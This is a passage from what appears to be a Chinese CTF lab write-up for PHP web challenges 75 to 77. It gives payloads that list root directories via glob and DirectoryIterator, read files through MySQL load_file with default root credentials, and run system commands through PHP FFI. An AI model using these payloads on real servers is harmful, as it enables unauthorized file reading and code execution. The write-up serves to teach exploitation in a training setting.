<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">查看根目录文件<br>c=var_export(glob(<span class="hljs-string">&#x27;../../..&#x27;</span>.<span class="hljs-string">&#x27;/*&#x27;</span>));<span class="hljs-keyword">exit</span>();<br>c=var_export(glob(<span class="hljs-string">&quot;/*&quot;</span>));<span class="hljs-keyword">exit</span>();<br>c=var_export(glob(<span class="hljs-string">&quot;/f*&quot;</span>));<span class="hljs-keyword">exit</span>();<br><br>查看文件内容<br>c=include(<span class="hljs-string">&quot;/flagx.txt&quot;</span>);die();<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-75（glob伪协议、php原生类DirectoryIterator、-toString、mysqli）"><a href="#web-75（glob伪协议、php原生类DirectoryIterator、-toString、mysqli）" class="headerlink" title="web-75（glob伪协议、php原生类DirectoryIterator、__toString、mysqli）"></a>web-75（glob伪协议、php原生类DirectoryIterator、__toString、mysqli）</h2><p>首先依然可以使用glob伪协议和php原生类打印根目录下文件，但是include限制包含文件夹</p>
<p>这里可以使用mysql的load_file函数</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">查看根目录下文件<br>c=?&gt;&lt;?php <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;echo(<span class="hljs-variable">$f</span>-<br>&gt;__toString().<span class="hljs-string">&#x27;-&#x27;</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);?&gt;<br><br>使用mysqli语句和load_file函数查询/flag36.txt内的内容然后输出<br>c=<span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;ctftraining&quot;</span>); <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select load_file(&#x27;/flag36.txt&#x27;) as a&quot;</span>; <span class="hljs-variable">$row</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>); <span class="hljs-keyword">while</span>(<span class="hljs-variable">$result</span>=mysqli_fetch_array(<span class="hljs-variable">$row</span>))&#123; echo <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;a&#x27;</span>]; &#125; <span class="hljs-keyword">exit</span>(); <br><br>使用PDD查询<br>c=try &#123;<span class="hljs-variable">$dbh</span> = new PDO(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>,<br><span class="hljs-string">&#x27;root&#x27;</span>);foreach(<span class="hljs-variable">$dbh</span>-&gt;query(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) as <span class="hljs-variable">$row</span>)<br>&#123;echo(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>; &#125;<span class="hljs-variable">$dbh</span> = null;&#125;catch (PDOException <span class="hljs-variable">$e</span>) &#123;echo <span class="hljs-variable">$e</span>-<br>&gt;getMessage();<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>

<h2 id="web-76（同上）"><a href="#web-76（同上）" class="headerlink" title="web-76（同上）"></a>web-76（同上）</h2><p>步骤和payload与上题差不多，就改了下flag文件名</p>
<h2 id="web-77（FFI、glob伪协议）"><a href="#web-77（FFI、glob伪协议）" class="headerlink" title="web-77（FFI、glob伪协议）"></a>web-77（FFI、glob伪协议）</h2><p>FFI，php7.4以上才有 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a> <a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">首先查看目录 看看flag 在哪里 ，上上题的PHP原生类查看目录也可以用<br>c=<span class="hljs-variable">$a</span> =<span class="hljs-string">&quot;glob:///*&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span> = opendir(<span class="hljs-variable">$a</span>))<br>&#123; <span class="hljs-keyword">while</span>( (<span class="hljs-variable">$file</span> = readdir(<span class="hljs-variable">$b</span>)) !== false )&#123; echo <span class="hljs-string">&quot;filename:&quot;</span>.<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;\n&quot;</span>; &#125; closedir(<span class="hljs-variable">$b</span>); &#125;<span class="hljs-keyword">exit</span>;<br><br><br>然后<br>c=<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>); <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; /var/www/html/1.txt&#x27;</span>; <span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-variable">$a</span>); <span class="hljs-keyword">exit</span>(); <br>再次使用 <br>c=readgzfile(<span class="hljs-string">&quot;1.txt&quot;</span>);<span class="hljs-keyword">exit</span>; <span class="hljs-regexp">//</span>拿到flag<br></code></pre></td></tr></table></figure>


      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
    </div>
</article>





    <div id="comments">
    <script>
        {
            const comments = document.getElementById("comments");
            const script = document.createElement("script");
            script.src = "https://giscus.app/client.js";
            script.setAttribute('data-repo', "MIXBP/MIXBP.github.io");
            script.setAttribute('data-repo-id', "R_kgDONYaZsg");
            script.setAttribute('data-category', "Announcements");
            script.setAttribute('data-category-id', "DIC_kwDONYaZss4ClAnT");
            script.setAttribute('data-mapping', "pathname");
            script.setAttribute('data-strict', "0");
            script.setAttribute('data-reactions-enabled', "1");
            script.setAttribute('data-emit-metadata', "0");
            script.setAttribute('data-input-position', "top");
            script.setAttribute('data-theme', "noborder_dark");
            script.setAttribute('data-lang', "zh-CN");
            script.setAttribute('data-loading', "lazy");
            script.setAttribute('crossorigin', "anonymous");
            script.setAttribute('async', "");
            comments.appendChild(script);
        }
    </script>
</div>



    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    ©MIXBP 2024
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    

    /* 背景图样式 */
    
    #post {
        background: url(/img/background.jpg);
    }
    
    
    #post .index {
        background: url(/img/background2.jpg);
    }
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.5;
        background: url("/img/bjtp.jpg");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>






<div class="mobile-menus-out" >

</div>
<div class="mobile-menus">
    
    
    
    <a class="dynamic-menu " target="_self"   href="https://mixbp.github.io/">MIXBP</a>
    
    
    <a class="dynamic-menu " target="_blank"  href="https://mixbp.github.io/">github</a>
    
</div>


</html>
